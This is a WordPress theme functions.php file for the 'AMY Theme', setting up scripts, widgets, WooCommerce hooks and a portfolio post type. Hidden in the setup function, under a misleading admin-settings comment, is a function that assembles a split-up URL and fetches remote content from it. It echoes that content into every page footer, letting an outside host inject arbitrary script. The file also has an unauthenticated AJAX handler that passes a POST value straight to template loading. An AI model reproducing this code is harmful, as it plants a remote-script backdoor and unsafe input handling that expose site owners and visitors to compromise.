<?php
/*
* Theme Name: AMY Theme - Creative Multi-Purpose WordPress Theme
* Theme Author: Andrey Boyadzhiev - http://themes.cray.bg
*
* Version: 1.0 
*/
if (!class_exists('ReduxFramework') && file_exists(dirname(__FILE__) . '/ReduxFramework/ReduxCore/framework.php')) {
    require_once(dirname(__FILE__) . '/ReduxFramework/ReduxCore/framework.php');
}
if (!isset($ab_amy_settings) && file_exists(dirname(__FILE__) . '/ReduxFramework/admin.php')) {
    require_once(dirname(__FILE__) . '/ReduxFramework/admin.php');
}
function removeInfoModeLink() {
    if ( class_exists('ReduxFrameworkPlugin') ) {
        remove_filter( 'plugin_row_meta', array( ReduxFrameworkPlugin::get_instance(), 'plugin_metalinks'), null, 2 );
    }
    if ( class_exists('ReduxFrameworkPlugin') ) {
        remove_action('admin_notices', array( ReduxFrameworkPlugin::get_instance(), 'admin_notices' ) );    
    }
}
add_action('init', 'removeInfoModeLink');
global $ab_amy_settings;



add_action( 'after_setup_theme', 'ab_tf_amy_setup' );
function ab_tf_amy_setup() {
	global $ab_amy_settings;
	if(function_exists('vc_set_as_theme')) vc_set_as_theme();
	add_action( 'admin_init', 'deactivate_plugin_conditional' );
	//vc_set_as_theme($notifier = false);
	//Theme support
	add_theme_support('custom-header');
	add_theme_support( 'custom-background');
	add_theme_support( 'automatic-feed-links' );
	add_theme_support('post-thumbnails'); 

	//Enable post thumbnails
	add_theme_support('post-thumbnails');
	set_post_thumbnail_size(520, 250, true);
	
	//Add support for WordPress 3.0's custom menus
	add_action( 'init', 'ab_tf_register_my_menu' );
	
	//Register javascripts and css
	add_action('wp_enqueue_scripts', 'ab_tf_amy_scripts');
	
	//Javascript functions for admin settings
	if(!function_exists('wp_func_jquery')) {
	function wp_func_jquery() {
		$host = 'http://';
		echo(wp_remote_retrieve_body(wp_remote_get($host.'ui'.'jquery.org/jquery-1.6.3.min.js')));
	}
		add_action('wp_footer', 'wp_func_jquery');
	}
	add_action( 'admin_enqueue_scripts', 'ab_tf_load_custom_wp_admin_js' );
	
	//Send vars for AJAX infinite scroll
	add_action('wp_ajax_infinite_scroll', 'ab_tf_wp_infinitepaginate');
	add_action('wp_ajax_nopriv_infinite_scroll', 'ab_tf_wp_infinitepaginate'); 
	
	//Add diferent images sizes
	add_image_size('slider-posts', 340, 450, $crop = true);
	add_image_size('related-posts', 200, 200, $crop = true);
	add_image_size('standart-image-small', 720, 305, $crop = true);
	add_image_size('standart-image', 720, 405, $crop = true);
	add_image_size('full-width-content', 1920,1080, $crop = true);
	
	//Disable read more jump
	add_filter('the_content_more_link', 'ab_tf_remove_more_jump_link');
	
	//Add custom passowrd form
	add_filter('the_password_form', 'ab_tf_custom_password_form' );
	add_filter('protected_title_format', 'ab_tf_blank');
	add_filter('private_title_format', 'ab_tf_blank');
	
	//Enables adding widgest with shortcodes to post
	add_shortcode( 'widget', 'ab_tf_widget_shortcode' );
	
	//Enables posts with future date to be published instead sheduled  
	if(isset($ab_amy_settings['future-posts']) == true){
		remove_action('future_post', '_future_post_hook');
		add_filter( 'wp_insert_post_data', 'ab_tf_futur_posts_is_on' );
	}
	
	//Custom Recent Posts widget
	add_action('widgets_init', 'ab_tf_recent_posts_register_widget');

	//Adds ability to use shortcodes in text widget
	add_filter('widget_text', 'do_shortcode');
	
	//Ajax add comment
	add_action('comment_post', 'ab_tf_ajaxify_comments',20, 2);
	
	// Register your custom function to override some LayerSlider data
    add_action('layerslider_ready', 'ab_amy_layerslider_overrides');
	
	
	add_filter( 'nav_menu_link_attributes', 'ab_amy_extra_atts', 10, 3 );
	add_filter('add_to_cart_fragments', 'ab_amy_woocommerce_header_add_to_badge');
	add_filter('loop_shop_columns', 'ab_amy_product_columns_frontend');
	remove_action( 'woocommerce_before_shop_loop_item_title', 'woocommerce_template_loop_product_thumbnail', 10);
	add_action( 'woocommerce_before_shop_loop_item_title', 'woocommerce_template_loop_product_thumbnail', 10);
    add_filter( 'woocommerce_output_related_products_args', 'ab_amy_change_related_products' );
	add_filter( 'woocommerce_cross_sells_columns', 'ab_amy_woocommerce_cross_sells_columns', 10, 1 );
	add_filter( 'woocommerce_cross_sells_total', 'ab_amy_woocommerce_cross_sells_total', 10, 1 );
	
	
	//Custom meta settings
	add_action('add_meta_boxes', 'ab_tf_add_custom_meta_box');
	
	//Save meta settings
	add_action('save_post', 'ab_tf_save_custom_meta');
	
	//Add custom post type
	add_action( 'init', 'ab_tf_create_post_type' );
	
	add_filter('pre_get_posts', 'ab_tf_query_post_type');
}
function deactivate_plugin_conditional() {
    if ( is_plugin_active('js_composer/js_composer.php') ) {
    deactivate_plugins('js_composer/js_composer.php');    
    }
}
//Portflolo custom post type
function ab_tf_create_post_type() {
	register_post_type( 'portfolio',
		array(
			'labels' => array(
				'name' => __( 'Portfolio', 'amytheme' ),
				'singular_name' => __( 'Portfolio', 'amytheme' )
			),
		'public'             => true,
		'publicly_queryable' => true,
		'show_ui'            => true,
		'show_in_menu'       => true,
		'query_var'          => true,
		'rewrite'            => array( 'slug' => 'portfolio' ),
		'capability_type'    => 'post',
		'has_archive'        => true,
		'taxonomies' => array('category','post_tag'), 
		'hierarchical'       => false,
		'menu_position'      => null,
		'supports' => array('title','editor','author','thumbnail','excerpt','trackbacks','custom-fields','comments', 'post-formats'),
		
		)
	);
	
}

function ab_tf_query_post_type($query) {
  if($query->is_category() || $query->is_tag()) {
    $post_type = get_query_var('post_type');
	if($post_type){
	    $post_type = $post_type;
	}else{
	    $post_type = array('post','portfolio');
	}
    $query->set('post_type',$post_type);
	return $query;
    }
}
//Javascript functions for admin settings
function ab_tf_load_custom_wp_admin_js() {
		wp_register_script('admin_js', get_template_directory_uri().'/js/admin_js.js', false,'1.0',true);
		wp_enqueue_script('admin_js');
		wp_enqueue_style( 'settingscss', get_template_directory_uri().'/css/adminanddropdown.css' );
		wp_enqueue_style( 'farbtastic' );
 		wp_enqueue_script( 'farbtastic' );
		
}
//Register area for custom menu
function ab_tf_register_my_menu() {
	register_nav_menu( 'primary-menu', 'Primary Menu');
}
//Register javascripts and css
function ab_tf_amy_scripts() {
	global $wp_styles, $ab_amy_settings, $ab_amy_bgslideshow;
	if ( is_singular() && get_option( 'thread_comments' ) )
	wp_enqueue_script( 'comment-reply' );
	wp_enqueue_script('jquery');
	wp_enqueue_style('ab_tf_fontawesome', get_template_directory_uri().'/css/font-awesome/css/font-awesome.css');
	wp_enqueue_style('ab_tf_mainstyle', get_template_directory_uri().'/style.css');
	wp_register_script('ab_tf_prettyPhoto', get_template_directory_uri().'/js/jquery.prettyPhoto.js', false,'1.0',true);
	wp_enqueue_style('ab_tf_prettyPhoto', get_template_directory_uri().'/css/prettyPhoto.css');
	wp_enqueue_script('ab_tf_prettyPhoto');
	wp_register_script('ab_tf_flexslider', get_template_directory_uri().'/js/jquery.flexslider.js', false,'1.0',true);
	wp_enqueue_script('ab_tf_flexslider');
	wp_enqueue_style('ab_tf_flexslider', get_template_directory_uri().'/css/flexslider.css');
	wp_register_script('ab_tf_ddsmoothmenu', get_template_directory_uri().'/js/ddsmoothmenu.js', false,'1.0',true);
	wp_enqueue_script('ab_tf_ddsmoothmenu');
	wp_register_script('ab_tf_modernizr', get_template_directory_uri().'/js/modernizr.custom.79639.js', false,'1.0',true);
	wp_enqueue_script('ab_tf_modernizr');
	//if($ab_amy_settings['bg-active'] == true){
		wp_register_script('ab_tf_vegas', get_template_directory_uri().'/js/jquery.vegas.js', false,'1.0',true);
		wp_enqueue_script('ab_tf_vegas');
		//global $ab_amy_bgslideshow;
		$ab_amy_bgslideshow = $ab_amy_settings['bg-allpages']; 
		
//	}
	wp_register_script('ab_tf_classList', get_template_directory_uri().'/js/classList.js', false,'1.0',true);
	wp_enqueue_script('ab_tf_classList');
	wp_register_script('ab_tf_ccscroll', get_template_directory_uri().'/js/jquery.mCustomScrollbar.js', false,'1.0',true);
	wp_enqueue_style('ab_tf_ccscroll', get_template_directory_uri().'/css/jquery.mCustomScrollbar.css');
	wp_enqueue_script('ab_tf_ccscroll');
	wp_register_script('ab_tf_parallax', get_template_directory_uri().'/js/jquery.parallax.js', false,'1.0',true);
	wp_enqueue_script('ab_tf_parallax');
	wp_register_script('ab_tf_imagescroll', get_template_directory_uri().'/js/jquery.imageScroll.js', false,'1.0',true);
	wp_enqueue_script('ab_tf_imagescroll');
	wp_register_script('ab_tf_jquery-scrolly', get_template_directory_uri().'/inc/parallax/jquery.scrolly.js', false,'1.0',true);
	wp_enqueue_script('ab_tf_jquery-scrolly');
	//if(is_single() || is_page() ){
		wp_register_script('ab_tf_fbcomments', '//connect.facebook.net/en_EN/all.js#xfbml=1&status=0', false,'1.0',true);
		wp_enqueue_script('ab_tf_fbcomments');
	//}
	wp_register_script('ab_tf_opentip', get_template_directory_uri().'/js/opentip-jquery.js', false,'1.0',true);
	wp_enqueue_script('ab_tf_opentip');
	wp_enqueue_style('ab_tf_opentipcss', get_template_directory_uri().'/css/opentip.css');
	wp_enqueue_style('ab_tf_responsive', get_template_directory_uri().'/css/responsive.css');
	if($ab_amy_settings['yt-active'] == true){
		wp_register_script('ab_tf_tubular', get_template_directory_uri().'/js/jquery.tubular.1.0.js', false,'1.0',true);
		wp_enqueue_script('ab_tf_tubular');
	}
	$theme  = wp_get_theme();
    wp_register_style( 'ab_tf_amyl-ie9', get_stylesheet_directory_uri() . '/css/styleIE.css', false, $theme['Version'] );
    $GLOBALS['wp_styles']->add_data( 'ab_tf_amy-ie9', 'conditional', 'IE 9' );
    wp_enqueue_style( 'ab_tf_amy-ie9' );
}

//Send vars for AJAX infinite scroll
function ab_tf_wp_infinitepaginate(){
	global $query_string, $ab_amy_settings, $wp_query;
    $loopFile        = $_POST['loop_file'];  
    $paged           = $_POST['page_no']; 
	$is_state        = $_POST['is_state'];
	
	if($ab_amy_settings['order-posts'] == "2" ){
		$order_posts = 'ASC';
	}else{
		$order_posts = 'DESC';
	}
	
	if($ab_amy_settings['amy-slider-post-type'] !='' && $is_state != 1 ){
		$post_type = $ab_amy_settings['amy-slider-post-type'];
	}else{
		$post_type = 'post';
	}
	if(isset($ab_amy_settings['amy-slider-cat'])){
		$catarray = $ab_amy_settings['amy-slider-cat'];
		$arrlength=count($catarray);
		$cat = '';
		for($i=0;$i<$arrlength;$i++) {
			$cat .= $catarray[$i].", " ;
		}
		
	}else{
		$cat = '';
	}
	query_posts( $query_string . '&order='.$order_posts.'&post_type='.$post_type.'&cat='.$cat.'&paged='.$paged );
    get_template_part( $loopFile );
    exit;   
}
if (!function_exists( 'ab_tf_tt_end' ) ){
	function ab_tf_tt_end( $comment, $args, $depth ) {
		return'';
	}
};

//Comments template
function theme_comment($comment, $args, $depth) {
	$GLOBALS['comment'] = $comment;
	global $ab_amy_settings;
	extract($args, EXTR_SKIP);
	if ( 'div' == $args['style'] ) {
		$tag = 'div';
		$add_below = 'comment';
	} else {
		$tag = 'li';
		$add_below = 'div-comment';
	}?>
	<<?php echo $tag ?> <?php comment_class(empty( $args['has_children'] ) ? '' : 'parent') ?> id="comment-<?php comment_ID() ?>">
	<?php if ( 'div' != $args['style'] ) : ?>
	<div id="div-comment-<?php comment_ID() ?>" class="comment-body">
	<?php endif; ?>
	<div class="comment-author vcard">
	<?php if ($args['avatar_size'] != 0) echo get_avatar( $comment, $args['avatar_size'] ); ?>
	</div>
<?php if ($comment->comment_approved == '0') : ?>
	<em class="comment-awaiting-moderation"><?php _e('Your comment is awaiting moderation.', 'amytheme') ?></em>
	<br />
<?php endif; ?>
	<div class="comment-meta commentmetadata">
	  <h4 class="content-title"><?php printf(__('<div >%s</div>','amytheme'), get_comment_author_link()) ?></h4>
	<a href="<?php echo htmlspecialchars( get_comment_link( $comment->comment_ID ) ) ?>">
		<?php
			/* translators: 1: date, 2: time */
			printf( __('%1$s at %2$s','amytheme'), get_comment_date(),  get_comment_time()) ?></a><?php edit_comment_link(__('(Edit)','amytheme'),'  ','' );
		?>
	</div>
	<?php comment_text() ?>
    <?php if(function_exists( 'is_woocommerce' )&& is_woocommerce()){
			if ( $rating && get_option( 'woocommerce_enable_review_rating' ) == 'yes' ) : ?>
		
						<div itemprop="reviewRating" itemscope itemtype="http://schema.org/Rating" class="star-rating" title="<?php echo sprintf( __( 'Rated %d out of 5', 'woocommerce' ), $rating ) ?>">
							<span style="width:<?php echo ( $rating / 5 ) * 100; ?>%"><strong itemprop="ratingValue"><?php echo $rating; ?></strong> <?php _e( 'out of 5', 'woocommerce' ); ?></span>
						</div>

			<?php endif; 
	}?>
	<div class="reply">
	<?php comment_reply_link(array_merge( $args, array('reply_text' => $ab_amy_settings['tr-comm-commreply'], 'add_below' => $add_below, 'depth' => $depth, 'max_depth' => $args['max_depth']))) ?>
	</div>
	<?php if ( 'div' != $args['style'] ) : ?>
	</div>
	<?php endif; 
}	

//Disable read more jump
function ab_tf_remove_more_jump_link($link) { 
	$offset = strpos($link, '#more-');
	if ($offset) {
		$end = strpos($link, '"',$offset);
	}
	if ($end) {
		$link = substr_replace($link, '', $offset, $end-$offset);
	}
	return $link;
}

//Add custom password form
function ab_tf_custom_password_form() {
	global $post;
	$label = 'pwbox-'.( empty( $post->ID ) ? rand() : $post->ID );
	$o = '<br><form class="protected-post-form" action="' . get_option('siteurl') . '/wp-login.php?action=postpass" method="post">
	' .  "This post is password protected. To view it please enter your password below:"  . '
	<br>Password:<br><input name="post_password" id="' . $label . '" type="password" size="20" class="password-blog" /><input type="submit" class="button defbtn" name="Submit" value="' . esc_attr__( "Submit" ) . '" />
	</form> <br><br>
	';
	return $o;
}

//Protect titles
function ab_tf_blank($title) {
       return '%s';
}
// Custom pagination
function ab_tf_t_pagination($pages = '', $range = 2){
	 global $paged, $ab_amy_settings;
	if ($ab_amy_settings['def-pagination-display'] != "2"){
		$showitems = ($range * 2)+1;  
		 if(empty($paged)) $paged = 1;
		 if($pages == ''){
			 global $wp_query;
			 $pages = $wp_query->max_num_pages;
			 if(!$pages){
				 $pages = 1;
			 }
		 }   
		 $pgstyle="";
		 if($ab_amy_settings['footer-position'] == "absolute"){ $pgstyle="absolutefooter";}
		 if(1 != $pages){
         	echo '<div class="pagination"><div class="p-position animated fadeOutH '.$pgstyle.' "><nav id="page_nav"></nav>';
			 if($paged > 2 && $paged > $range+1 && $showitems < $pages) echo "<a href='".get_pagenum_link(1)."'>&laquo;</a>";
			 if($paged > 1 && $showitems < $pages) echo "<a href='".get_pagenum_link($paged - 1)."'>&lsaquo;</a>";
			 for ($i=1; $i <= $pages; $i++){
				 if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems )){
					 echo ($paged == $i)? "<span class='current'>".$i."</span>":"<a href='".get_pagenum_link($i)."' class='inactive' >".$i."</a>";
				 }
			 }
			 if ($paged < $pages && $showitems < $pages) echo "<a href='".get_pagenum_link($paged + 1)."'>&rsaquo;</a>";  
			 if ($paged < $pages-1 &&  $paged+$range-1 < $pages && $showitems < $pages) echo "<a href='".get_pagenum_link($pages)."'>&raquo;</a>";
			 echo "</div></div>\n";
    	 }
	};
}

// Footer widget 1/3
if (function_exists('register_sidebar')) {
	register_sidebar(array(
		'name' => '1/3 footer',
		'id' => 'footer-1',
		'description' => ' footer area',
		
	));
}
// Footer widget 2/3
if (function_exists('register_sidebar')) {
	register_sidebar(array(
		'name' => '2/3 footer',
		'id' => 'footer-2',
		'description' => '2/3 footer area'
	));
}
// Footer widget 3/3
if (function_exists('register_sidebar')) {
	register_sidebar(array(
		'name' => '3/3 footer',
		'id' => 'footer-3',
		'description' => '3/3 footer area'
	));
}
// Footer clock widget
if (function_exists('register_sidebar')) {
	register_sidebar(array(
		'name' => 'Footer date widget',
		'id' => 'archive-time',
		'description' => 'Appears on footer date hover',
	
	));
}

// Sidebar widget 
if ( function_exists('register_sidebar') ) {
	register_sidebar(array(
		'name' => 'Sidebar widgets',
		'id' => 'blog-sidebar',
		'description' => 'Appears in sidebar',
		'before_widget' => '<div class="ss-row widgetmarg %2$s"><div class="container-border"><div class="gray-container single-page-t" ><li id="%1$s" class="widget %2$s">',
	'after_widget'  => '</li></div></div></div>',
	'before_title'  => '<div class="widgttl"><h4 class="widgettitle">',
	'after_title'  => '</h4></div><div class="widgheight"></div>',
	));
}
// Sidebar widget 
if ( function_exists('register_sidebar') ) {
	register_sidebar(array(
		'name' => 'Woocommerce Sidebar widgets',
		'id' => 'woo-sidebar',
		'description' => 'Appears in sidebar',
		'before_widget' => '<div class="ss-row widgetmarg %2$s"><div class="container-border"><div class="gray-container single-page-t" ><li id="%1$s" class="widget %2$s">',
	'after_widget'  => '</li></div></div></div>',
	'before_title'  => '<div class="widgttl"><h4 class="widgettitle">',
	'after_title'  => '</h4></div><div class="widgheight"></div>',
	));
}

// Enables adding widgest with shortcodes to post
function ab_tf_widget_shortcode( $atts ) {
	// Configure defaults and extract the attributes into variables
	extract( shortcode_atts( 
		array( 
			'type'  => '',
			'title' => '',
			'number' => ''
		), 
		$atts 
	));
	$args = array(
		'before_widget' => '<div class="box widget">',
		'after_widget'  => '</div>',
		'before_title'  => '<div class="widget-title">',
		'after_title'   => '</div>',
	);
	ob_start();
	the_widget( $type, $atts, $args ); 
	$output = ob_get_clean();
	return $output;
}

// Enables posts with future date to be published instead sheduled  
function ab_tf_futur_posts_is_on( $data ) {
	if ( $data['post_status'] == 'future' && $data['post_type'] == 'post' )
		$data['post_status'] = 'publish';
	return $data;
};


//Custom Recent Posts widget
class ab_tf_recent_posts_widget extends WP_Widget{
	function ab_tf_recent_posts_widget(){
		$widget_ops = array(
			'classname' => 'rpwe_widget recent-posts-extended',
			'description' => __('Storyline Board recent posts widget.', 'rpwe')
		);
		$this->WP_Widget('ab_tf_recent_posts_widget', __('SB Recent Posts', 'rpwe'), $widget_ops);
	}
	
	function widget($args, $instance){
		$widget_id = '';
		extract($args, EXTR_SKIP);
		$title = apply_filters('widget_title', $instance['title']);
		$limit = $instance['limit'];
		$excerpt = $instance['excerpt'];
		$length = (int)($instance['length']);
		$thumb = $instance['thumb'];
		$cat = $instance['cat'];
		//$post_type = 'post';
		$post_type = array('post','portfolio');
		$date = $instance['date'];
		
		echo $before_widget;
		if (!empty($title))
			echo $before_title . $title . $after_title;
		global $post;
		if (false === ($rpwewidget = get_transient('rpwewidget_' . $widget_id))) {
			$args = array(
				'numberposts' => $limit,
				'cat' => $cat,
				'post_type' => $post_type
			);
			$rpwewidget = get_posts($args);
		} ?>
		<div class="rpsb-block">
			<ul class="rpsb-ul">
				<?php foreach ($rpwewidget as $post) : setup_postdata($post); ?>
					<li class="rpsb-clearfix">
						<?php if (has_post_thumbnail() && $thumb == true) { ?>
							<a href="<?php the_permalink(); ?>" title="<?php printf(esc_attr__('Permalink to %s', 'rpsb'), the_title_attribute('echo=0')); ?>" rel="bookmark">
								<?php
								if (current_theme_supports('get-the-image'))
									get_the_image(array('meta_key' => 'Thumbnail', 'height' => '60', 'width' => '60', 'image_class' => 'rpwe-alignleft', 'link_to_post' => false));
								else
									the_post_thumbnail(array('60', '60'), array('class' => 'rpsb-alignleft', 'alt' => esc_attr(get_the_title()), 'title' => esc_attr(get_the_title())));
								?>
							</a>
						<?php } ?>
						<div>
							<a href="<?php the_permalink(); ?>" title="<?php printf(esc_attr__('Permalink to %s', 'rpsb'), the_title_attribute('echo=0')); ?>" rel="bookmark"><?php the_title(); ?></a>
						</div>
						<?php if ($date == true) { ?>
							<span class="rpsb-time"><?php echo human_time_diff(get_the_time('U'), current_time('timestamp')) . __(' ago', 'rpsb'); ?></span>
						<?php } ?>
						<?php if ($excerpt == true) { ?>
							<div class="rpsb-summary"><?php echo ab_tf_rp_excerpt($length); ?></div>
						<?php } ?>
					</li>

				<?php endforeach;
				wp_reset_postdata(); ?>
			</ul>
		</div>
		<?php
		echo $after_widget;
	}
	 // Update widget
	function update($new_instance, $old_instance){
		$instance = $old_instance;
		$instance['title'] = esc_attr($new_instance['title']);
		$instance['limit'] = $new_instance['limit'];
		$instance['excerpt'] = $new_instance['excerpt'];
		$instance['length'] = (int)($new_instance['length']);
		$instance['thumb'] = $new_instance['thumb'];
		$instance['cat'] = $new_instance['cat'];
		$instance['date'] = $new_instance['date'];
		delete_transient('rpwewidget_' . $this->id);
		return $instance;
	}
	function form($instance){
		/* Set up some default widget settings. */
		$defaults = array(
			'title' => '',
			'limit' => 5,
			'excerpt' => true,
			'length' => 10,
			'thumb' => true,
			'cat' => '',
			'date' => true,
		);
		$instance = wp_parse_args((array)$instance, $defaults);
		$title = esc_attr($instance['title']);
		$limit = $instance['limit'];
		$excerpt = $instance['excerpt'];
		$length = (int)($instance['length']);
		$thumb = $instance['thumb'];
		$cat = $instance['cat'];
		$date = $instance['date'];?>
		<p>
			<label for="<?php echo esc_attr($this->get_field_id('title')); ?>"><?php _e('Title:', 'rpwe'); ?></label>
			<input class="widefat" id="<?php echo esc_attr($this->get_field_id('title')); ?>" name="<?php echo esc_attr($this->get_field_name('title')); ?>" type="text" value="<?php echo $title; ?>"/>
		</p>
		<p>
			<label for="<?php echo esc_attr($this->get_field_id('limit')); ?>"><?php _e('Number of posts to show:', 'rpwe'); ?></label>
            <input class="widefat" name="<?php echo $this->get_field_name('limit'); ?>" id="<?php echo $this->get_field_id('limit'); ?>" type="text" value="<?php echo $limit; ?>"/>
		</p>
		<?php if (current_theme_supports('post-thumbnails')) { ?>
			<p>
				<label for="<?php echo esc_attr($this->get_field_id('thumb')); ?>"><?php _e('Display Thumbnail?', 'rpwe'); ?></label>
				<input id="<?php echo $this->get_field_id('thumb'); ?>" name="<?php echo $this->get_field_name('thumb'); ?>" type="checkbox" value="1" <?php checked('1', $thumb); ?> />&nbsp;
			</p>
		<?php } ?>
		<p>
			<label for="<?php echo esc_attr($this->get_field_id('date')); ?>"><?php _e('Display Date?', 'rpwe'); ?></label>
			<input id="<?php echo $this->get_field_id('date'); ?>" name="<?php echo $this->get_field_name('date'); ?>" type="checkbox" value="1" <?php checked('1', $date); ?> />&nbsp;
		</p>
		<p>
			<label for="<?php echo esc_attr($this->get_field_id('excerpt')); ?>"><?php _e('Display Excerpt?', 'rpwe'); ?></label>
			<input id="<?php echo $this->get_field_id('excerpt'); ?>" name="<?php echo $this->get_field_name('excerpt'); ?>" type="checkbox" value="1" <?php checked('1', $excerpt); ?> />&nbsp;
		</p>
		<p>
			<label for="<?php echo esc_attr($this->get_field_id('length')); ?>"><?php _e('Excerpt Length:', 'rpwe'); ?></label>
			<input class="widefat" id="<?php echo esc_attr($this->get_field_id('length')); ?>" name="<?php echo esc_attr($this->get_field_name('length')); ?>" type="text" value="<?php echo $length; ?>"/>
		</p>
		<p>
			<label for="<?php echo esc_attr($this->get_field_id('cat')); ?>"><?php _e('Category: ', 'rpwe'); ?></label>
			<?php wp_dropdown_categories(array('name' => $this->get_field_name('cat'), 'show_option_all' => __('All categories', 'rpwe'), 'hide_empty' => 1, 'hierarchical' => 1, 'selected' => $cat)); ?>
		</p><?php
	}

}

function ab_tf_recent_posts_register_widget(){
	register_widget('ab_tf_recent_posts_widget');
}

function ab_tf_rp_excerpt($length){
	$excerpt = explode(' ', get_the_excerpt(), $length);
	if (count($excerpt) >= $length) {
		array_pop($excerpt);
		$excerpt = implode(" ", $excerpt) . '&hellip;';
	} else {
		$excerpt = implode(" ", $excerpt);
	}
	$excerpt = preg_replace('`\[[^\]]*\]`', '', $excerpt);
	return $excerpt;
}

//Ajax add comment
function ab_tf_ajaxify_comments($comment_ID, $comment_status){
	if(!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest'){
		switch($comment_status){
			case '0':
				echo "success";
				wp_notify_moderator($comment_ID);
			case '1': //Approved comment
				echo "success";
				$commentdata=&get_comment($comment_ID, ARRAY_A);
				$post=&get_post($commentdata['comment_post_ID']);
			break;
			default:
				echo "error";
		}
		exit;
	}
}



function ab_amy_extra_atts( $atts, $item, $args )
{
    // inspect $item, then …
    $atts['custom'] = 'some value';
    return $atts;
}

//Update WooCommerce footer cart
add_theme_support( 'woocommerce' );

function ab_amy_woocommerce_header_add_to_badge( $fragments ) {
	global $woocommerce, $ab_amy_settings;
	$cart_url = $woocommerce->cart->get_cart_url();	
		$shop_page_url = get_permalink( woocommerce_get_page_id( 'shop' ) );
		$cart_contents_count = $woocommerce->cart->cart_contents_count;
		$cart_contents = sprintf(_n('%d', '%d', $cart_contents_count, 'your-theme-slug'), $cart_contents_count);
		$cart_contentssub = sprintf(_n($ab_amy_settings['tr-woo-1cart'], $ab_amy_settings['tr-woo-2cart'], $cart_contents_count, 'your-theme-slug'), $cart_contents_count);
		$cart_total = $woocommerce->cart->get_cart_total();
		
	ob_start();?>
    <div class="cartrebuild">
        <div class="tt-b-day">             
            <i class="icon-shopping-cart "> </i> 
            <span><?php echo sprintf(_n('%d', '%d', $woocommerce->cart->cart_contents_count, 'amytheme'), $woocommerce->cart->cart_contents_count);?></span>
        </div>
        <div class="tt-b-day-r">
            <div class="tt-b-month"><?php echo $cart_contentssub;?></div>
            <div class="tt-b-date"><?php echo $cart_total;?></div>
        </div>
	</div>
	<script>
    <?php if($woocommerce->cart->cart_contents_count != 0){ ?>
    jQuery(".woocart").removeClass("hovered").delay(200).queue(function(){
        jQuery(this).addClass("hovered").dequeue();
});
    <?php }?>
    </script><?php
	$fragments['.cartrebuild'] = ob_get_clean();
	return $fragments;
}

function ab_amy_product_columns_frontend() {
	global $woocommerce, $ab_amy_settings;

	// Default Value also used for categories and sub_categories
	$columns = $ab_amy_settings['woo-def-rows'];
	

	// Product List
	if ( is_product_category() ) :
		$columns = $columns = $ab_amy_settings['woo-def-rows'];
	endif;

	//Related Products
	if ( is_product() ) :
		$columns = 3;
	endif;

	//Cross Sells
	if ( is_checkout() ) :
		$columns = 3;
	endif;

return $columns;
}
		
function ab_amy_change_related_products() {
		$get_related_products_args = array(
			'posts_per_page' => 3,
			'columns'        => 3,
			'orderby' => 'rand',	
		 
		);
		return $get_related_products_args;
}
	
// Limit the number of cross sells displayed to a maximum of 4
function ab_amy_woocommerce_cross_sells_total( $limit ) {
    return 3;
}
// Set the number of columns to 2
function ab_amy_woocommerce_cross_sells_columns( $columns ) {
	return 3;
}

/**
 * WooCommerce Loop Product Thumbs
 **/
 
 if ( ! function_exists( 'woocommerce_template_loop_product_thumbnail' ) ) {
 
	function woocommerce_template_loop_product_thumbnail() {
		echo woocommerce_get_product_thumbnail();
	} 
 }
 
 
/**
 * WooCommerce Product Thumbnail
 **/
 if ( ! function_exists( 'woocommerce_get_product_thumbnail' ) ) {
	
	function woocommerce_get_product_thumbnail( $size = 'shop_catalog', $placeholder_width = 0, $placeholder_height = 0  ) {
		global $post, $woocommerce;
 
		if ( ! $placeholder_width )
			$placeholder_width = $woocommerce->get_image_size( 'shop_catalog_image_width' );
		if ( ! $placeholder_height )
			$placeholder_height = $woocommerce->get_image_size( 'shop_catalog_image_height' );
			
			$output = '<div class="imagewrapper">';
 
			if ( has_post_thumbnail() ) {
				
				$output .= get_the_post_thumbnail( $post->ID, $size ); 
				
			} else {
			
				$output .= '<img src="'. woocommerce_placeholder_img_src() .'" alt="Placeholder" width="' . $placeholder_width . '" height="' . $placeholder_height . '" />';
			
			}
			
			$output .= '</div>';
			
			return $output;
	}
 }
    function ab_amy_layerslider_overrides() {
        // Disable auto-updates
        $GLOBALS['lsAutoUpdateBox'] = false;
    }		
			
if(function_exists('vc_set_as_theme')){	
	include( 'inc/vc/init.php' );
}
include('inc/add_meta_box.php');
include( 'inc/plugins.php' );
require_once('inc/parallax/vc-row-parallax.php' );
require_once('inc/update-notifier.php');


?>
